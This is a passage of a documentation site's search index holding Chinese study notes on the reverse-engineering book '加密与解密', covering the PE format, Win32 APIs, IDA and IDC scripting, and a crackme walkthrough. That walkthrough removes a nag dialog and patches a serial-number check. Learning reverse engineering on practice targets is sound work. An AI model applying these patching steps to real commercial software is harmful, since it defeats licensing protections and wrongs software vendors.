其他外来DLL的函数和数据，输入表\n\n\n.rsrc 模块的全部资源：图标、菜单、位图\n\n\n磁盘文件和内存中的结构一致\n\n\n\n\n相关名词\n\n\n\n\n入口点\n\n\n\n\n程序执行时第一行代码的位置\n\n\n\n\n文件偏移地址\n\n\n\n\n文件在磁盘上时，各数据的地址\n\n\n\n\n\n\n虚拟地址\n\n\n\n\n\n\n内存偏移地址\n\n\n\n\n\n\n格式：段：偏移量（e.g 0167:00401000）\n\n\n\n\ncs段选择器，段选择子：0167\n\n\n虚拟地址：00401000\n\n\n\n\n\n\n\n\n基地址 Image Base\n\n\n\n\n\n\n文件执行时被映射到指定内存的地址\n\n\n\n\n有pe文件决定\n\n\nvc++建立的exe\n\n\nexe基地址：0040000h\n\n\ndll基地址： 1000000h", 
            "title": "加密与解密 第一章 基础知识"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#_1", 
            "text": "", 
            "title": "第一章 基础知识"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#11", 
            "text": "", 
            "title": "1.1 文本字符"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#111", 
            "text": "Little-Encoding :Intel体系芯片   高字节存入低地址，低字节存入高地址   Big-Encoding：RSIC架构CPU   高字节存入高地址，低字节存入低地址", 
            "title": "1.1.1 字节存储顺序"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#112-asciiunicode", 
            "text": "ASCII      ASCII值  控制字符  ASCII值  控制字符  ASCII值  控制字符  ASCII值  控制字符      0  NUT  32  (space)  64  @  96  、    1  SOH  33  !  65  A  97  a    2  STX  34  \"  66  B  98  b    3  ETX  35  #  67  C  99  c    4  EOT  36  $  68  D  100  d    5  ENQ  37  %  69  E  101  e    6  ACK  38   70  F  102  f    7  BEL  39  ,  71  G  103  g    8  BS  40  (  72  H  104  h    9  HT  41  )  73  I  105  i    10  LF  42  *  74  J  106  j    11  VT  43  +  75  K  107  k    12  FF  44  ,  76  L  108  l    13  CR  45  -  77  M  109  m    14  SO  46  .  78  N  110  n    15  SI  47  /  79  O  111  o    16  DLE  48  0  80  P  112  p    17  DCI  49  1  81  Q  113  q    18  DC2  50  2  82  R  114  r    19  DC3  51  3  83  S  115  s    20  DC4  52  4  84  T  116  t    21  NAK  53  5  85  U  117  u    22  SYN  54  6  86  V  118  v    23  TB  55  7  87  W  119  w    24  CAN  56  8  88  X  120  x    25  EM  57  9  89  Y  121  y    26  SUB  58  :  90  Z  122  z    27  ESC  59  ;  91  [  123  {    28  FS  60   92  /  124  |    29  GS  61  =  93  ]  125  }    30  RS  62   94  ^  126  `    31  US  63  ?  95  _  127  DEL      unicode   所有字符都是16位", 
            "title": "1.1.2 ASCII与UNICODE编码"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#12", 
            "text": "", 
            "title": "1.2 操作系统"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#121-win-api", 
            "text": "动态链接库    Kernel  核心功能   进程线程  内存管理  文件访问     User  用户接口   键盘和鼠标输入  窗口和菜单管理     GDI  图形设备接口   屏幕和打印机显示文本和图像", 
            "title": "1.2.1 win api"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#122-win32-api", 
            "text": "", 
            "title": "1.2.2 常用win32 api 函数"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#hmemcpy", 
            "text": "这是一个Win16 API函数，位于位的KRNL386.EXE链接库里。是系统底层的东西，没有特殊需要，一般不直接调用    功能：执行的操作很简单，只是将内存中的一块数据COPY到另一个地方    在Windows 9x中，Win32函数调用通过转换层转换为Win16函数调用，所以Windows 9x底层频繁的调用hmemcpy这个位的函数来拷贝数据    它经常被解密者作为断点拦截数据，别称“万能断点”    c\n  void hmemcpy(\n    void _huge *hpvDest,            //目地数据地址\n    const void _huge *hpvSource,    //源数据地址\n    long cbCopyn                    //数据大小\n  );", 
            "title": "hmemcpy"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#getwindowtext", 
            "text": "此函数在USER32.DLL用户模块中，它的作用是取得一个窗体的标题文字，或者一个文本控件的内容    如果成功返回文本长度;失败则返回零值    ANSI版是GetWindowTextA  Unicode版是GetWindowTextW    ```c\n  int GetWindowText(\n    HWND hWnd,              //窗口或文件空间句柄\n    LPTSTR lpString,        //缓冲区地址\n    int nMaxCount           //复制的最大字符数\n                   );  ```", 
            "title": "GetWindowText"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#getdlgitem", 
            "text": "此函数在USER32.DLL用户模块中，它的作用是获取指定对话框的句柄  如果成功返回对话框的句柄；失败则返回零   HWND GetDlgItem(\n\n    HWND hDlg,                 //对话框句柄\n\n    int nIDDlgItem             //控件标识\n                  );", 
            "title": "GetDlgItem"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#getdlgitemtext", 
            "text": "此函数在USER32.DLL用户模块中，它的作用是获取对话框文本  如果成功返回文本长度；失败则返回零  ANSI版是GetDlgItemTextA  Unicode版是GetDlgItemTextW   UINT GetDlgItemText(\n\n    HWND hDlg,                 //对话框句柄      \n\n    int nIDDlgItem,            //空间标识(ID号)\n\n    LPTSTR lpString,       //文本缓冲区指针\n\n    int nMaxCount         //字符缓冲区的长度\n\n                          );", 
            "title": "GetDlgItemText"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#getdlgitemint", 
            "text": "此函数在USER32.DLL用户模块中，它的作用是获取对话框整数值  如果成功，lpTranslated被设置为TRUE   UINT GetDlgItemInt(\n\n    HWND hDlg,                 //对话框句柄\n\n    int nIDDlgItem,            //空间标识\n\n    BOOL *lpTranslated,        //接受成功/失败指示的指针\n\n    BOOL bSigned          //指定是有符号数还是无符号数\n\n                     )", 
            "title": "GetDlgItemInt"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#messagebox", 
            "text": "此函数在USER32.DLL用户模块中，创建和显示信息框  ANSI版是MessageBoxA  Unicode版是MessageBoxW   int MessageBox(\n\n    HWND hDlg,                 //父窗口句柄\n\n    LPCTSTR lpText,            //消息框文本地址\n\n    LPCTSTR lpCaption,     //消息框标题地址\n\n    UINT uType                 //消息框样式\n\n                );", 
            "title": "MessageBox"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#getdlgitemtext_1", 
            "text": "是根据控件ID来取文字，GetWindowText是根据控件句柄或者指针来取", 
            "title": "GetDlgItemText"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#123", 
            "text": "windows标识  由应用程序建立或使用的对象所使用的唯一的整数值（32位）", 
            "title": "1.2.3 什么是句柄"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#124-windows-9x-unicode", 
            "text": "大部分的32位函数只是调用了16位版本  有少量的unicode版本的函数  MessageBox  大部分的函数只有unicode的参数进入点，但其实并不将unicode码转成ascii，而是直接返回失败的消息", 
            "title": "1.2.4 windows 9.x 和unicode"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#125-windows-nt2000xp-unicode", 
            "text": "内核只使用unicode", 
            "title": "1.2.5 windows NT/2000/XP 与unicode"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#126-windows", 
            "text": "windows应用程序之间、应用程序与windows系统之间的进行通信的手段    两个队列    系统消息队列   应用程序消息队列   按消息到达的先后进行处理    常用windows消息函数    SendMessage    将一条消息发送给某个函数   返回值  WM_COMMAND  用户从菜单或者按钮选择一条命令或者一个控件，发送给其父窗口  或者一个快捷键被释放时  应用程序处理这条消息，则返回0  WM_DESTORY  一个窗口被破坏时发送  WM_GETTEXT  将程序提供的文本拷贝到一个呼叫程序提供的缓冲区  WM_QUIT  当应用程序调用PostQuitMessage函数  WM_LEFTBUTTONDOWN  光标在一个窗口的客户区，用户按下了鼠标左键  未被捕获，就发送给光标下的窗口", 
            "title": "1.2.6 windows消息机制"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#13", 
            "text": "模式  实模式  保护模式  虚拟x86模式", 
            "title": "1.3 保护模式"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#131", 
            "text": "实模式  寻址方式：段基址+段偏移  段大小：64K  所有段可读写，只有代码段可执行  保护模式  段选择子+段偏移  段选择子：不参与选址，只是GDT或者LDT的指针  不同的段寄存器有不同的属性  读  写  执行  特选级    win32平坦内存模式  每个进程有自己的虚拟空间，32位进程位4GB  程序的代码不区分代码段和数据段  4GB中，2GB给应用程序（也可达到3G），2GB给操作系统  操作系统和系统DLL所有时间片都必须映射  用户exe只在属于自己的时间片映射  用户DLL有选择的映射  虚拟内存的实现方法：  程序启动，分配2GB虚拟地址  应用程序代码映射到虚拟内存某个位置  使用了DLL，则也映射该DLL  数据、堆栈等也进行映射  程序从虚拟地址执行", 
            "title": "1.3.1 虚拟内存"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#132", 
            "text": "权限级别   4个等级：0，1，2，3    0级    执行所有指令、访问所有数据   操作系统核心层运行在0级  hal.dll（硬件抽象层）   ntoskrnl.exe的上层    3级    指令有限、数据有限    win32子系统运行在3级   kernel.dll  user32.dll  gdi32.dll     ntdll.dll  用户层导出并且可以调用的函数接口    用户的应用程序", 
            "title": "1.3.2 保护模式的权限级别"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#14-pe", 
            "text": "", 
            "title": "1.4 PE格式"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#_2", 
            "text": ".txt 全部指令代码  .rdata 运行期的只读数据  .data 初始化数据块  .idata 其他外来DLL的函数和数据，输入表  .rsrc 模块的全部资源：图标、菜单、位图  磁盘文件和内存中的结构一致", 
            "title": "区块"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/#_3", 
            "text": "入口点   程序执行时第一行代码的位置   文件偏移地址   文件在磁盘上时，各数据的地址    虚拟地址    内存偏移地址    格式：段：偏移量（e.g 0167:00401000）   cs段选择器，段选择子：0167  虚拟地址：00401000     基地址 Image Base    文件执行时被映射到指定内存的地址   有pe文件决定  vc++建立的exe  exe基地址：0040000h  dll基地址： 1000000h", 
            "title": "相关名词"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/", 
            "text": "加密与解密 第2篇 调试篇\n\n\n第三章 静态分析技术\n\n\n3.1 文件类型分析\n\n\n3.1.1 PEiD工具\n\n\n\n\noption -\n register shell extensions\n\n\n扩展文件接口 userdb.txt，可以自定义一些特征码，识别出新的文件类型\n\n\n签名制作插件：add signature，配合od修正\n\n\n\n\n3.1.2 fileinfo工具\n\n\n3.2 静态反汇编\n\n\n3.2.1 反汇编引擎\n\n\n\n\nudis86\n\n\nade\n\n\nxde\n\n\nmlde32\n\n\nvirxasm\n\n\nod插件：FullDisasm\n\n\n\n\n3.2.2 ipa pro简介\n\n\n\n\n\n\n分析过程分2个阶段\n\n\n\n\n\n\n将程序和代码分开\n\n\n为函数做标记并分析其参数调用\n\n\n分析跳转、调用等指令关系并给标签赋值等\n\n\n\n\n\n\n识别出文件的编译类型，装载对应的编译器特征文件，给各函数赋名\n\n\n\n\n\n\n加载出现错误\n\n\n\n\n\n\nida分析出有问题的代码\n\n\n关闭 \nKernel Options1-\nmake final analysis pass\n\n\n\n\n\n\n一些代码不在预计的位置而不被确认\n\n\n关闭\nKernel Options2-\ncoagulate data segments in the final pass\n\n\n\n\n\n\n3.2.3 ida配置\n\n\n\n\n\n\nidag.cfg文件\n\n\n\n\n\n\n编辑工具：editplus、Ultraplus\n\n\n\n\n\n\n组成：\n\n\n\n\n\n\n定义文件的扩展名、内存、屏幕等\n\n\n\n\n\n\n配置普通参数：代码显示格式、ascii字符显示格式、脚本定义、处理器选项\n\n\n\n\n\n\n一些问题\n\n\n\n\n\n\nmax_item_lines :默认5000，许多大文件不够用\n\n\n\n\n\n\n选项\n\n\n\n\n\n\n反汇编选项\n\n\n\n\nascii字符串与符号\n\n\n显示中文字符\n\n\n\n\n3.2.4 IDA主窗口界面\n\n\n3.2.5 交叉参考\n\n\n\n\nX键： 打开交叉参考窗口\n\n\n\n\n3.2.6 参考重命名\n\n\n\n\nN键\n\n\n\n\n3.2.7 标签的用法\n\n\n\n\nctrl+M:跳到标记位置\n\n\n\n\n3.2.8 进制的转换\n\n\n3.2.9 代码和数据转换\n\n\n\n\nC键：切换为指令\n\n\nP键：定义为子程序\n\n\nU键：重新以16进制数显示\n\n\nD键：db、dw、dd之间转换\n\n\n\n\n3.2.10 字符串\n\n\n\n\nA键：弹出ida支持的字符串格式\n\n\nG键：跳转到某一地址\n\n\n空格键：切换流程图和反汇编模式\n\n\nN键：重命名地址为某字符串\n\n\n\n\n3.2.11 数组\n\n\n\n\nedit/array 小键盘\n*\n:weary:\n\n\n\n\n3.2.12 结构体\n\n\n\n\n\n\nshift+F11：加载类型库窗口 -\n intert键：可用的类型库窗口\n\n\n\n\n\n\nshift+F9: 结构体管理窗口-\n insert键：增加结构体-\n add standart structure\n\n\n\n\n\n\nida 版本=5.x，shift+F9: 结构体管理窗口-\n insert键-\n cancel，结构体数据会显现出来\n\n\n\n\n\n\n按\n+\n键，展开结构体，但是貌似只有在小键盘上有效？笔记本悲催:sweat:\n\n\n\n\n\n\n结构体定义详细解释\n\n\n\n\n\n\nalt+Q: 在反汇编窗口中对数据应用结构体\n\n\n\n\n\n\nT键：在操作数类型中应用结构体\n\n\n\n\n\n\n批量替换结构体：选中需要替换的部分，T键，然后替换\n\n\n\n\n\n\n从已经分析好的数据中建立结构体，选择好分析好的数据后：\n\n\n\n\n\n\nedit/structs/create from data\n\n\n\n\n在结构体中嵌套结构体union（共用体）\n\n\n\n\n在结构体窗口中使用alt+Q\n\n\n\n\n从c文件头中导入结构 \nload file/parse c header file\n\n\n\n\n3.2.13 枚举类型\n\n\n\n\nshift+F10：打开枚举类型窗口\n\n\ninsert添加\n\n\n在代码窗口，M键替换\n\n\n支持bit-fileds类型\n\n\n\n\n3.2.14 堆栈变量\n\n\n\n\nctrl+k:打开堆栈窗口\n\n\n\n\n3.2.15 IDC脚本\n\n\n实例1 查看输入函数\n\n\n//Imports.idc 列出当前程序的输入函数\n//(c)  www.PEDIY.com 2000-2008\n\n#include \nidc.idc\n\n\nstatic GetImportSeg()\n{\n    auto ea, next, name;\n    ea = FirstSeg();\n    next = ea;\n    while ( (next = NextSeg(next)) != -1) {\n        name = SegName(next);\n        if ( substr( name, 0, 6 ) == \n.idata\n ) break;\n   }\n   return next;\n}\n\nstatic main()\n{\n    auto BytePtr, EndImports;\n    BytePtr = SegStart( GetImportSeg() );\n    EndImports = SegEnd( BytePtr );\n    Message(\n \\n\n + \nParsing Import Table...\\n\n);\n    while ( BytePtr \n EndImports ) {\n        if (LineA(BytePtr, 1) != \n) Message(\n\\n\n + \n____\n + LineA(BytePtr,1) + \n____\n + \n\\n\n);\n        Message(Name(BytePtr) + \n\\n\n);\n        BytePtr = NextAddr(BytePtr);\n    }\n    Message(\n\\n\n + \nImport Table Parsing Complete\\n\n);\n}\n\n\n\n\n\n\n导入idc脚本\n\n\n\n\nFile/idc file\n\n\n实例2 用idc分析加密代码\n\n\n\n\nSMC(self modifying code)\n\n\n\n\n```c\n  //encrypted.idc\n  //(c)  www.PEDIY.com 2000-2008\n\n\n#include \n\n  static decrypt(from, size, key ) { \n     auto i, x; \n     for ( i=0; i \n size; i=i+1 ) { \n        x = Byte(from); \n        x = (x^key); \n        PatchByte(from,x); \n        from = from + 1;\n     } \n\n\n} \n  ```\n\n\n\n\n\n\nfile/idc file\n引入idc文件\n\n\n\n\n\n\nshift+F2\n执行idc函数\n\n\nc\n decrypt(0x00401060,0x15,0x1)\n\n\n\n\n\n\nU\n将所有代码以数据形式显示出来\n\n\n\n\n\n\nC\n将此段代码重新分析\n\n\n\n\n\n\n结合od\n\n\n\n\n\n\n通过ida的\nadditional binary file\n的功能将od解码出的文件重新加载\n\n\n\n\n脚本工具：IDApython、IDAperl\n\n\n\n\n3.2.16 FLIRT\n\n\n\n\n\n\nfast library identificaiton and recongnition technology\n\n\n\n\n\n\n签名文件格式：.sig\n\n\n\n\n\n\nshift+F5\n：打开签名窗口\n\n\n\n\n\n\ninsert\n打开文件列表窗口，选中签名文件，然后激活\n\n\n应用后，将自动重新分析全部代码\n\n\n如果没有自动分析，\noptions/analysis\n-\n \nreanalyse program\n\n\n\n\n\n\n签名文件的制作：\n\n\n\n\n\n\n有lib文件的情况\n\n\n\n\npcf转换\n\n\n\n\npcf *.lib *.pat\n\n\n\n\nsigmake转换\n\n\n\n\nsigmake *.pat *.sig\n\n\n\n\n\n\n没有lib，只有dll\n\n\n\n\n反汇编该dll\n\n\nidb2pat插件生成pat\n\n\nsigmake签名\n\n\n\n\n\n\n\n\n3.2.17 插件\n\n\n\n\nhex-rays decomplier 反汇编成高级语言\n\n\n\n\n3.2.18 其他功能\n\n\n\n\n\n\n图形化模式\n\n\n\n\n\n\n加载符号文件\n\n\n\n\n\n\nload file/pdb file\n 自动从微软官网寻找最合适当前版本的pdb或dbg\n\n\n\n\n\n\napi帮助关联\n\n\n\n\n\n\n将idagui.cfg中的\nhelpfile\n指向本地windows api帮助文件\n\n\n\n\n\n\nctrl + F1\n实现查询\n\n\n\n\n\n\n文件输出\n\n\n\n\n\n\nfile/produce file\n\n\n\n\n\n\nmap文件\n\n\n各函数等符号信息\n\n\n\n\n\n\nasm文件\n\n\n仅输出汇编文件部分\n\n\n\n\n\n\ndump database to IDC file\n\n\n低版本向高版本恢复当前使用数据\n\n\n\n\n\n\ndump typeinfo to IDC file\n\n\n将用户自定义的数据类型保存到IDC文件\n\n\n\n\n\n\n3.3 可执行文件的修改\n\n\nhiew\n\n\n\n\n快捷键\n\n\n\n\n\n\n\n\n\n\n按键\n\n\n功能\n\n\n\n\n\n\n\n\n\n\nF5\n\n\n跳转到地址（支持相对地址和虚拟地址（前面加上\n.\n））\n\n\n\n\n\n\nF1\n\n\n帮助\n\n\n\n\n\n\nF3\n\n\n进入编辑状态\n\n\n\n\n\n\nF2\n\n\n修改汇编代码\n\n\n\n\n\n\nF9\n\n\n保存\n\n\n\n\n\n\n\n\n3.4 静态分析技术应用实例\n\n\n3.4.1 解密初步\n\n\n3.4.2 逆向工程初步\n\n\n1. 移除\"mission failed\"对话框\n\n\n\n\nIDA查看string窗口\n\n\n双击字符“...mission failed...”,到代码处\n\n\n双击交叉引用，记下地址\n\n\n在OD中跳转到此地址，可nop掉，也可jump掉过，此处跳过，在\npush 0\n处，修改为\njmp 0040124E\n\n\n\n\n2. 将输入字符显示到对话框\n\n\n\n\n在IDA name窗口中，双击GetWindowTextA的调用处\n\n\n发现有两次调用，第一处比较可疑，进入\n\n\nOD将\njmp eax\nnop掉，就可以执行下面的程序，GetWindowTextA将文本空间内容放到缓冲区，MessageBoxA从缓存区中读取文本并显示到消息框中\n\n\n\n\n3. 修改字符\n\n\n​   修改指定的字符串\n\n\n\n\n\n\n查找指定字符串的两种方式\n\n\n\n\n\n\nIDA-\n shift+F12\n\n\n\n\n\n\nOD -\n 鼠标右键-Search for-\nAll referenced text strings\n \n\n\n\n\n\n\nOD -\n鼠标右键-中文搜索-智能搜索\n -\n CTRL+F\n\n\nida给出的结果会更符合要求，OD给出了太多的结果\n\n\n    **new: 智能搜索更好用**\n\n\n\n\n\n\n\n在ida中找到字符串之后，在od跳转到该地址\n\n\n\n\n\n\n在该处右键-\n follow dump-\n selection，会在内存窗口中看到该字符串\n\n\n\n\n\n\nctrl+e\n修改，可以在notepad中写好，然后使用\nshift+insert\n粘贴\n\n\n\n\n\n\n选中修改部分，右键-\ncopy to executalbe file\n\n\n\n\n\n\n在弹出的窗口中，选择修改后的部分，右键-\nsave file\n\n\n\n\n\n\n\n\n\n\n4. 完成序列号验证\n\n\n\n\n\n\n找到合适的地址\n\n\n\n\n\n\n在od中修改，代码如下\n\n\n\n\n\n\n？不知道有没有一次性复制粘贴的办法\n\n\nx86asm\n   cmp ecx,5\n   jnz 4012CD\n   mov edx,403000\n   mov bl,[eax]\n   mov bh,[edx]\n   cmp bl,bh\n   jnz 4012CD\n   inc eax\n   inc edx\n   dec ecx\n   jz 4012B8\n   jmp 40127A\n\n\n\n\n保存\n\n\n\n\n3.5 补充\n\n\n3.5.1 快捷键\n\n\n\n\n\n\n\n\n功能键\n\n\n功能\n\n\n\n\n\n\n\n\n\n\nR\n\n\n将16机制码以字符串形式解读\n\n\n\n\n\n\nF5\n\n\n显示反汇编的源码\n\n\n\n\n\n\nshift+F12\n\n\n显示strings窗口\n\n\n\n\n\n\nalt+T\n\n\n文本搜索\n\n\n\n\n\n\nctrl+T\n\n\n继续下一个查找\n\n\n\n\n\n\nalt+B\n\n\n二进制搜索\n\n\n\n\n\n\nB\n\n\n2/16进制转换\n\n\n\n\n\n\nA\n\n\n解释光标处的地址为一个字符串的首地址\n\n\n\n\n\n\nH\n\n\n16/10进制转换\n\n\n\n\n\n\n；\n\n\n注释\n\n\n\n\n\n\nX\n\n\n转换视图为交叉参考模式\n\n\n\n\n\n\nshift+E\n\n\n提取数据\n\n\n\n\n\n\nshift+F1\n\n\n导出数据\n\n\n\n\n\n\n\n\n\n\nF5：查看源代码的过程中，及时将变量名(\nN键\n)改为有意义的名称\n\n\n函数窗口：红色的无法反汇编成源码，白色的可以", 
            "title": "加密与解密 第三章 静态调试技术"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#_1", 
            "text": "", 
            "title": "第三章 静态分析技术"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#31", 
            "text": "", 
            "title": "3.1 文件类型分析"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#311-peid", 
            "text": "option -  register shell extensions  扩展文件接口 userdb.txt，可以自定义一些特征码，识别出新的文件类型  签名制作插件：add signature，配合od修正", 
            "title": "3.1.1 PEiD工具"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#312-fileinfo", 
            "text": "", 
            "title": "3.1.2 fileinfo工具"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#32", 
            "text": "", 
            "title": "3.2 静态反汇编"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#321", 
            "text": "udis86  ade  xde  mlde32  virxasm  od插件：FullDisasm", 
            "title": "3.2.1 反汇编引擎"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#322-ipa-pro", 
            "text": "分析过程分2个阶段    将程序和代码分开  为函数做标记并分析其参数调用  分析跳转、调用等指令关系并给标签赋值等    识别出文件的编译类型，装载对应的编译器特征文件，给各函数赋名    加载出现错误    ida分析出有问题的代码  关闭  Kernel Options1- make final analysis pass    一些代码不在预计的位置而不被确认  关闭 Kernel Options2- coagulate data segments in the final pass", 
            "title": "3.2.2 ipa pro简介"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#323-ida", 
            "text": "idag.cfg文件    编辑工具：editplus、Ultraplus    组成：    定义文件的扩展名、内存、屏幕等    配置普通参数：代码显示格式、ascii字符显示格式、脚本定义、处理器选项    一些问题    max_item_lines :默认5000，许多大文件不够用    选项    反汇编选项   ascii字符串与符号  显示中文字符", 
            "title": "3.2.3 ida配置"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#324-ida", 
            "text": "", 
            "title": "3.2.4 IDA主窗口界面"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#325", 
            "text": "X键： 打开交叉参考窗口", 
            "title": "3.2.5 交叉参考"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#326", 
            "text": "N键", 
            "title": "3.2.6 参考重命名"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#327", 
            "text": "ctrl+M:跳到标记位置", 
            "title": "3.2.7 标签的用法"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#328", 
            "text": "", 
            "title": "3.2.8 进制的转换"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#329", 
            "text": "C键：切换为指令  P键：定义为子程序  U键：重新以16进制数显示  D键：db、dw、dd之间转换", 
            "title": "3.2.9 代码和数据转换"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#3210", 
            "text": "A键：弹出ida支持的字符串格式  G键：跳转到某一地址  空格键：切换流程图和反汇编模式  N键：重命名地址为某字符串", 
            "title": "3.2.10 字符串"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#3211", 
            "text": "edit/array 小键盘 * :weary:", 
            "title": "3.2.11 数组"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#3212", 
            "text": "shift+F11：加载类型库窗口 -  intert键：可用的类型库窗口    shift+F9: 结构体管理窗口-  insert键：增加结构体-  add standart structure    ida 版本=5.x，shift+F9: 结构体管理窗口-  insert键-  cancel，结构体数据会显现出来    按 + 键，展开结构体，但是貌似只有在小键盘上有效？笔记本悲催:sweat:    结构体定义详细解释    alt+Q: 在反汇编窗口中对数据应用结构体    T键：在操作数类型中应用结构体    批量替换结构体：选中需要替换的部分，T键，然后替换    从已经分析好的数据中建立结构体，选择好分析好的数据后：    edit/structs/create from data   在结构体中嵌套结构体union（共用体）   在结构体窗口中使用alt+Q   从c文件头中导入结构  load file/parse c header file", 
            "title": "3.2.12 结构体"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#3213", 
            "text": "shift+F10：打开枚举类型窗口  insert添加  在代码窗口，M键替换  支持bit-fileds类型", 
            "title": "3.2.13 枚举类型"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#3214", 
            "text": "ctrl+k:打开堆栈窗口", 
            "title": "3.2.14 堆栈变量"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#3215-idc", 
            "text": "", 
            "title": "3.2.15 IDC脚本"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#1", 
            "text": "//Imports.idc 列出当前程序的输入函数\n//(c)  www.PEDIY.com 2000-2008\n\n#include  idc.idc \n\nstatic GetImportSeg()\n{\n    auto ea, next, name;\n    ea = FirstSeg();\n    next = ea;\n    while ( (next = NextSeg(next)) != -1) {\n        name = SegName(next);\n        if ( substr( name, 0, 6 ) ==  .idata  ) break;\n   }\n   return next;\n}\n\nstatic main()\n{\n    auto BytePtr, EndImports;\n    BytePtr = SegStart( GetImportSeg() );\n    EndImports = SegEnd( BytePtr );\n    Message(  \\n  +  Parsing Import Table...\\n );\n    while ( BytePtr   EndImports ) {\n        if (LineA(BytePtr, 1) !=  ) Message( \\n  +  ____  + LineA(BytePtr,1) +  ____  +  \\n );\n        Message(Name(BytePtr) +  \\n );\n        BytePtr = NextAddr(BytePtr);\n    }\n    Message( \\n  +  Import Table Parsing Complete\\n );\n}   导入idc脚本   File/idc file", 
            "title": "实例1 查看输入函数"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#2-idc", 
            "text": "SMC(self modifying code)   ```c\n  //encrypted.idc\n  //(c)  www.PEDIY.com 2000-2008  #include  \n  static decrypt(from, size, key ) { \n     auto i, x; \n     for ( i=0; i   size; i=i+1 ) { \n        x = Byte(from); \n        x = (x^key); \n        PatchByte(from,x); \n        from = from + 1;\n     }   } \n  ```    file/idc file 引入idc文件    shift+F2 执行idc函数  c\n decrypt(0x00401060,0x15,0x1)    U 将所有代码以数据形式显示出来    C 将此段代码重新分析    结合od    通过ida的 additional binary file 的功能将od解码出的文件重新加载   脚本工具：IDApython、IDAperl", 
            "title": "实例2 用idc分析加密代码"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#3216-flirt", 
            "text": "fast library identificaiton and recongnition technology    签名文件格式：.sig    shift+F5 ：打开签名窗口    insert 打开文件列表窗口，选中签名文件，然后激活  应用后，将自动重新分析全部代码  如果没有自动分析， options/analysis -   reanalyse program    签名文件的制作：    有lib文件的情况   pcf转换   pcf *.lib *.pat   sigmake转换   sigmake *.pat *.sig    没有lib，只有dll   反汇编该dll  idb2pat插件生成pat  sigmake签名", 
            "title": "3.2.16 FLIRT"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#3217", 
            "text": "hex-rays decomplier 反汇编成高级语言", 
            "title": "3.2.17 插件"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#3218", 
